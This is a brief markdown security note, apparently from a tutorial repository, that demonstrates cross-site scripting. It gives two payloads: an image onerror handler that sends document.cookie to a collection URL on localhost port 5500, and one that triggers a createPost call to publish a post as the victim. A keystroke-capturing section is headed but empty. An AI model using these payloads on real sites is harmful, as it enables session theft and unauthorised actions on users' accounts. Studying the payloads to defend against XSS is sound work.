# Security

### User Session Hijacking

User Session hacking by sending in the user cookie to hack personal login info (cookie, token)

```let query = encodeURIComponent('<img src="does-not-exist" onerror="var img = document.createElement('img');
                img.src = `http://127.0.0.1:5500/cookie?data=${encodeURIComponent(document.cookie)}`;
                document.querySelector(\'body\').appendChild(img);">');
```

If the user hits the above query url the cookie is sent to the external url http://127.0.0.1:5500/cookie:

![User Seesion/cookie hijacking](/Security/XSS/images/userSessionHijacking.png)

### UnAuthorised Access/Activities

The hacker might do unwanted activities like in below case the function to create the post is called,

```let query =  encodeURIComponent('<img src="does-not-exist"
  onerror="createPost('This is very bad title','You are Terminated! hacked! Good Bye!!')"/>');
```

If the user hits the above query with url a unwanted post is created on behalf of the user
![User Unathorised access](/Security/XSS/images/unauthorizedAccess.png)

### Capturing key Strokes
